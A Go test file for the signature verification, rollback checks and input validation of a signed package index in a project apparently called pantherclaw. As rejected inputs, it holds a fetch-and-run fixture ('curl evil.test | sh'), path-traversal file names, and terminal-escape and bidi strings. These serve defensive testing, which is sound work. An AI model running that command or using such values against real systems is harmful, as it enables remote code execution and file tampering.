// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2026 Joshua Kato. See LICENSE and NOTICE.

package domain_test

import (
	"crypto/ed25519"
	"encoding/json/jsontext"
	"encoding/json/v2"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/katocxl/pantherclaw/internal/definitions/trust"
	"github.com/katocxl/pantherclaw/internal/hub"
	"github.com/katocxl/pantherclaw/internal/hub/domain"
	"github.com/katocxl/pantherclaw/internal/platform/crypto/jws"
	"github.com/katocxl/pantherclaw/internal/platform/rootkey"
)

// Covers: F840, F841, F845

var now = time.Date(2026, 10, 31, 12, 0, 0, 0, time.UTC)

func signer(t *testing.T, p rootkey.Purpose) *jws.Signer {
	t.Helper()
	priv, kid, err := rootkey.Generate(p)
	if err != nil {
		t.Fatal(err)
	}
	s, err := jws.NewSigner(kid, priv)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func roots(s *jws.Signer) domain.Roots { return domain.Roots{s.KeyID(): s.Public()} }

func itemFile(t *testing.T, name, version string, kind domain.Kind, body any) []byte {
	t.Helper()
	b, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	raw, err := json.Marshal(map[string]any{
		"spec": domain.ItemSpec, "name": name, "version": version, "kind": kind, "body": jsontext.Value(b),
	}, json.Deterministic(true))
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func entryOf(name, version string, kind domain.Kind, raw []byte) domain.Entry {
	return domain.Entry{
		Name: name, Version: version, Kind: kind, SHA256: domain.Digest(raw), Size: int64(len(raw)), Title: "A title", Summary: "A summary",
	}
}

func index(version uint64, items ...domain.Entry) domain.Index {
	return domain.Index{
		Version: version, IssuedAt: now.Format(time.RFC3339), ExpiresAt: now.AddDate(0, 0, 90).Format(time.RFC3339), Items: items,
	}
}

func sampleRaw(t *testing.T) []byte {
	t.Helper()
	return itemFile(t, "pc.coding.read-only-agent", "1.0.0", domain.KindDetectionRule, domain.DetectionRuleBody{Content: "id: org.x"})
}

func sample(t *testing.T) domain.Index {
	t.Helper()
	return index(3, entryOf("pc.coding.read-only-agent", "1.0.0", domain.KindDetectionRule, sampleRaw(t)))
}

// TestHR560_HubDocumentNeverVerifiesAsAPackageDocument: a Hub index, even
// signed by a key the package verifier trusts, is no targets document.
//
// Covers: T-242
func TestHR560_HubDocumentNeverVerifiesAsAPackageDocument(t *testing.T) {
	hubKey := signer(t, rootkey.PurposeHub)
	doc, err := domain.Sign(sample(t), hubKey)
	if err != nil {
		t.Fatal(err)
	}
	// The package verifier given the Hub key under the Hub key's own kid.
	if _, err := trust.Verify(doc, trust.Roots{hubKey.KeyID(): hubKey.Public()}, now); !errors.Is(err, trust.ErrUntrusted) {
		t.Fatalf("a Hub index as targets: %v", err)
	}
	// One key used as both roots, and a body shaped like targets under the
	// Hub typ: the typ alone refuses it.
	pkg := signer(t, rootkey.PurposePackages)
	targets := trust.Targets{
		Type: "targets", Spec: trust.Spec, Version: 1, Expires: now.AddDate(0, 0, 1).Format(time.RFC3339),
		Targets: map[string]trust.Target{"pc.demo@1.0.0": {Length: 1, Hashes: map[string]string{"sha256": strings.Repeat("a", 64)}}},
	}
	payload, err := json.Marshal(targets)
	if err != nil {
		t.Fatal(err)
	}
	forged, err := pkg.Sign(domain.JOSEType, payload)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := trust.Verify(forged, trust.Roots{pkg.KeyID(): pkg.Public()}, now); !errors.Is(err, trust.ErrUntrusted) {
		t.Fatalf("targets under the Hub typ: %v", err)
	}
	// A Hub root is no package root.
	raw := fmt.Sprintf(`{"keys":[%s]}`, jwk(t, hubKey))
	if _, err := trust.ParseRoots([]byte(raw)); err == nil {
		t.Fatal("trust.ParseRoots took a Hub root")
	}
}

// TestHR560_PackageDocumentNeverVerifiesAsAHubDocument: the reverse: a
// targets document, even signed by a key the Hub verifier trusts, is no
// index.
//
// Covers: T-242
func TestHR560_PackageDocumentNeverVerifiesAsAHubDocument(t *testing.T) {
	pkg := signer(t, rootkey.PurposePackages)
	doc, err := trust.Sign(trust.Targets{
		Version: 1, Expires: now.AddDate(0, 0, 1).Format(time.RFC3339),
		Targets: map[string]trust.Target{"pc.demo@1.0.0": {Length: 1, Hashes: map[string]string{"sha256": strings.Repeat("a", 64)}}},
	}, pkg)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := domain.Verify(doc, roots(pkg), now); !errors.Is(err, domain.ErrSignature) {
		t.Fatalf("targets as an index: %v", err)
	}
	// An index payload under the package typ.
	payload, err := json.Marshal(func() domain.Index { x := sample(t); x.Spec = domain.IndexSpec; return x }())
	if err != nil {
		t.Fatal(err)
	}
	forged, err := pkg.Sign(trust.JOSEType, payload)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := domain.Verify(forged, roots(pkg), now); !errors.Is(err, domain.ErrSignature) {
		t.Fatalf("an index under the package typ: %v", err)
	}
	// The package root cannot sign an index, and is no Hub root.
	if _, err := domain.Sign(sample(t), pkg); err == nil {
		t.Fatal("the package root signed an index")
	}
	if _, err := domain.ParseRoots(fmt.Appendf(nil, `{"keys":[%s]}`, jwk(t, pkg))); err == nil {
		t.Fatal("domain.ParseRoots took a package root")
	}
}

func jwk(t *testing.T, s *jws.Signer) string {
	t.Helper()
	b, err := json.Marshal(jws.PublicJWK(s.Public(), s.KeyID()))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func TestRootKIDsMatchRootkey(t *testing.T) {
	for _, tc := range []struct {
		p   rootkey.Purpose
		kid func(ed25519.PublicKey) string
	}{{rootkey.PurposeHub, domain.RootKID}, {rootkey.PurposeDevHub, domain.DevKID}} {
		s := signer(t, tc.p)
		if s.KeyID() != tc.kid(s.Public()) {
			t.Errorf("%s: %s, want %s", tc.p, s.KeyID(), tc.kid(s.Public()))
		}
	}
	if !rootkey.PurposeHub.Root() || rootkey.PurposeDevHub.Root() {
		t.Fatal("hub is a root and hub-dev is not")
	}
}

// TestParseRootsNeverTakesTheDevKey: the development key cannot be embedded
// as a root (D101).
func TestParseRootsNeverTakesTheDevKey(t *testing.T) {
	dev := signer(t, rootkey.PurposeDevHub)
	raw := fmt.Appendf(nil, `{"keys":[%s]}`, jwk(t, dev))
	if _, err := domain.ParseRoots(raw); err == nil {
		t.Fatal("the development key parsed as a root")
	}
	if _, err := domain.ParseDevKey(raw); err != nil {
		t.Fatal(err)
	}
	if _, err := domain.ParseDevKey([]byte(`{"keys":[]}`)); err == nil {
		t.Fatal("no development key parsed")
	}
}

func TestEmbeddedRootsAreEmptyUntilTheFounderAddsOne(t *testing.T) {
	r, err := hub.EmbeddedRoots()
	if err != nil {
		t.Fatal(err)
	}
	if _, err := domain.Verify("x.y.z", r, now); len(r) == 0 && !errors.Is(err, domain.ErrNoRoot) {
		t.Fatalf("no roots: %v", err)
	}
}

func TestVerifyTamperAndExpiry(t *testing.T) {
	key := signer(t, rootkey.PurposeDevHub)
	doc, err := domain.Sign(sample(t), key)
	if err != nil {
		t.Fatal(err)
	}
	v, err := domain.Verify(doc, roots(key), now)
	if err != nil || v.Version != 3 || !domain.IsDevKID(v.KID) || len(v.Digest) != 64 {
		t.Fatalf("%+v %v", v, err)
	}
	parts := strings.Split(doc, ".")
	tampered := parts[0] + "." + parts[1][:len(parts[1])-2] + "AA." + parts[2]
	if _, err := domain.Verify(tampered, roots(key), now); !errors.Is(err, domain.ErrSignature) {
		t.Fatalf("tampered: %v", err)
	}
	if _, err := domain.Verify(doc, roots(signer(t, rootkey.PurposeDevHub)), now); !errors.Is(err, domain.ErrSignature) {
		t.Fatalf("another key: %v", err)
	}
	if _, err := domain.Verify(doc, roots(key), now.AddDate(1, 0, 0)); !errors.Is(err, domain.ErrExpired) {
		t.Fatalf("expired: %v", err)
	}
}

// TestHR562_CheckAdvance: a lower version, or the same version with another
// digest, is refused.
//
// Covers: T-243
func TestHR562_CheckAdvance(t *testing.T) {
	v := domain.Verified{Index: domain.Index{Version: 5}, Digest: "b"}
	if err := domain.CheckAdvance(nil, v); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		last domain.State
		bad  bool
	}{
		{domain.State{Version: 6, Digest: "x"}, true},
		{domain.State{Version: 5, Digest: "a"}, true},
		{domain.State{Version: 5, Digest: "b"}, false},
		{domain.State{Version: 4, Digest: "a"}, false},
	} {
		err := domain.CheckAdvance(&tc.last, v)
		if errors.Is(err, domain.ErrRollback) != tc.bad {
			t.Errorf("%+v: %v", tc.last, err)
		}
	}
}

// TestHR563_ItemsAreClosedKindsWithinLimits: unknown kinds and members,
// oversized files and malformed names are refused; every kind's body decodes
// strictly.
//
// Covers: T-242
func TestHR563_ItemsAreClosedKindsWithinLimits(t *testing.T) {
	good := map[domain.Kind]any{
		domain.KindPolicyTemplate: domain.PolicyTemplateBody{Rules: []map[string]any{{"id": "r", "per": "org"}}},
		domain.KindDetectionRule:  domain.DetectionRuleBody{Content: "id: org.x"},
		domain.KindRangeScenario:  domain.RangeScenarioBody{FileName: "CX-90001-a.yaml", Scenario: "id: CX-90001"},
		domain.KindToolPackage:    domain.ToolPackageBody{PackageYAML: "a: 1", TargetsJWS: "a.b.c"},
		domain.KindAutomation:     domain.AutomationBody{AutomationName: "a", Purpose: "p", WorkKind: "AGENT_WORK", Definition: "a: 1"},
	}
	for kind, b := range good {
		if _, err := domain.DecodeItem(itemFile(t, "pc.demo", "1.0.0", kind, b)); err != nil {
			t.Errorf("%s: %v", kind, err)
		}
		bad := itemFile(t, "pc.demo", "1.0.0", kind, map[string]any{"script": "curl evil.test | sh"})
		if _, err := domain.DecodeItem(bad); !errors.Is(err, domain.ErrItem) {
			t.Errorf("%s with a script member: %v", kind, err)
		}
	}
	for name, raw := range map[string][]byte{
		"unknown kind":  itemFile(t, "pc.demo", "1.0.0", "shell_script", map[string]any{"run": "x"}),
		"another name":  itemFile(t, "evil.demo", "1.0.0", domain.KindDetectionRule, good[domain.KindDetectionRule]),
		"path name":     itemFile(t, "pc.../../x", "1.0.0", domain.KindDetectionRule, good[domain.KindDetectionRule]),
		"upper name":    itemFile(t, "pc.Demo", "1.0.0", domain.KindDetectionRule, good[domain.KindDetectionRule]),
		"bad version":   itemFile(t, "pc.demo", "latest", domain.KindDetectionRule, good[domain.KindDetectionRule]),
		"top-level":     []byte(`{"spec":"pantherclaw.hub.item/1","name":"pc.demo","version":"1.0.0","kind":"detection_rule","body":{"content":"x"},"run":"x"}`),
		"wrong spec":    []byte(`{"spec":"pantherclaw.hub.item/2","name":"pc.demo","version":"1.0.0","kind":"detection_rule","body":{"content":"x"}}`),
		"too large":     make([]byte, domain.MaxItemBytes+1),
		"empty":         nil,
		"no body field": []byte(`{"spec":"pantherclaw.hub.item/1","name":"pc.demo","version":"1.0.0","kind":"detection_rule"}`),
	} {
		if _, err := domain.DecodeItem(raw); !errors.Is(err, domain.ErrItem) {
			t.Errorf("%s: %v", name, err)
		}
	}
}

// TestHR563_IndexLimits: more than 1,000 items, a validity over 180 days and
// text that could restyle a terminal do not sign or verify.
//
// Covers: T-242
func TestHR563_IndexLimits(t *testing.T) {
	key := signer(t, rootkey.PurposeHub)
	raw := sampleRaw(t)
	mk := func(i int) domain.Entry {
		return entryOf(fmt.Sprintf("pc.demo.n%d", i), "1.0.0", domain.KindDetectionRule, raw)
	}
	var many []domain.Entry
	for i := range domain.MaxItems + 1 {
		many = append(many, mk(i))
	}
	bad := map[string]domain.Index{
		"too many":  index(1, many...),
		"version 0": index(0, mk(0)),
		"twice":     index(1, mk(0), mk(0)),
		"too long": func() domain.Index {
			x := index(1, mk(0))
			x.ExpiresAt = now.AddDate(0, 0, 181).Format(time.RFC3339)
			return x
		}(),
		"backwards": func() domain.Index {
			x := index(1, mk(0))
			x.ExpiresAt = now.Add(-time.Hour).Format(time.RFC3339)
			return x
		}(),
		"not utc":    func() domain.Index { x := index(1, mk(0)); x.ExpiresAt = "2026-11-01T00:00:00+01:00"; return x }(),
		"escape":     func() domain.Index { e := mk(0); e.Title = "ok\x1b[2J"; return index(1, e) }(),
		"bidi":       func() domain.Index { e := mk(0); e.Summary = "ok" + string(rune(0x202e)) + "evil"; return index(1, e) }(),
		"oversize":   func() domain.Index { e := mk(0); e.Size = domain.MaxItemBytes + 1; return index(1, e) }(),
		"bad digest": func() domain.Index { e := mk(0); e.SHA256 = "ABC"; return index(1, e) }(),
		"bad kind":   func() domain.Index { e := mk(0); e.Kind = "binary"; return index(1, e) }(),
	}
	for name, x := range bad {
		if _, err := domain.Sign(x, key); err == nil {
			t.Errorf("%s signed", name)
		}
		payload, err := json.Marshal(func() domain.Index { x.Spec = domain.IndexSpec; return x }())
		if err != nil {
			t.Fatal(err)
		}
		doc, err := key.Sign(domain.JOSEType, payload)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := domain.Verify(doc, roots(key), now); !errors.Is(err, domain.ErrSignature) {
			t.Errorf("%s verified: %v", name, err)
		}
	}
	// The largest index verifies, past the 64 KiB a token may be.
	var most []domain.Entry
	for i := range domain.MaxItems {
		most = append(most, mk(i))
	}
	doc, err := domain.Sign(index(1, most...), key)
	if err != nil {
		t.Fatal(err)
	}
	if len(doc) <= jws.MaxCompactBytes {
		t.Fatalf("index of %d bytes", len(doc))
	}
	if len(doc) > domain.MaxIndexBytes {
		t.Fatalf("index of %d bytes is over the limit", len(doc))
	}
	if _, err := domain.Verify(doc, roots(key), now); err != nil {
		t.Fatalf("largest index: %v", err)
	}
	// Too many bytes is refused at both ends, never cut short (D100a).
	for i := range most {
		most[i].Summary = strings.Repeat("s", domain.MaxSummaryBytes)
	}
	big := index(1, most...)
	if _, err := domain.Sign(big, key); err == nil {
		t.Fatal("Sign accepted an index over the byte limit")
	}
	big.Spec = domain.IndexSpec
	payload, err := json.Marshal(big)
	if err != nil {
		t.Fatal(err)
	}
	over, err := key.Sign(domain.JOSEType, payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(over) <= domain.MaxIndexBytes {
		t.Fatalf("index of %d bytes", len(over))
	}
	if _, err := domain.Verify(over, roots(key), now); !errors.Is(err, domain.ErrSignature) {
		t.Fatalf("Verify took an index over the byte limit: %v", err)
	}
}

// TestHR563_ScenarioFileIsOnePlainName: pclaw writes this name to disk.
func TestHR563_ScenarioFileIsOnePlainName(t *testing.T) {
	for _, bad := range []string{"", "../CX-1.yaml", "CX-1/../../x.yaml", `CX-1\x.yaml`, "x.yaml", "CX-1.sh", "CX-1.yaml/", "C:CX-1.yaml", "/etc/CX-1.yaml", "CX-1-A.yaml", "RT-001-x.yaml"} {
		if domain.ValidScenarioFile(bad) {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"CX-90001.yaml", "CX-90001-merge-without-review.yaml"} {
		if !domain.ValidScenarioFile(good) {
			t.Errorf("%q refused", good)
		}
	}
}

func TestMatch(t *testing.T) {
	key := signer(t, rootkey.PurposeHub)
	raw := sampleRaw(t)
	doc, err := domain.Sign(sample(t), key)
	if err != nil {
		t.Fatal(err)
	}
	v, err := domain.Verify(doc, roots(key), now)
	if err != nil {
		t.Fatal(err)
	}
	e, it, err := v.Match(raw)
	if err != nil || e.Name != it.Name || it.Kind != domain.KindDetectionRule {
		t.Fatalf("%+v %+v %v", e, it, err)
	}
	tampered := append([]byte(nil), raw...)
	tampered[len(tampered)-3] ^= 1
	if _, _, err := v.Match(tampered); !errors.Is(err, domain.ErrDigest) {
		t.Fatalf("tampered: %v", err)
	}
	// Signed bytes that declare something else than their entry.
	other := itemFile(t, "pc.other", "1.0.0", domain.KindDetectionRule, domain.DetectionRuleBody{Content: "x"})
	doc, err = domain.Sign(index(4, entryOf("pc.coding.read-only-agent", "1.0.0", domain.KindDetectionRule, other)), key)
	if err != nil {
		t.Fatal(err)
	}
	if v, err = domain.Verify(doc, roots(key), now); err != nil {
		t.Fatal(err)
	}
	if _, _, err := v.Match(other); !errors.Is(err, domain.ErrDigest) {
		t.Fatalf("declares another: %v", err)
	}
}
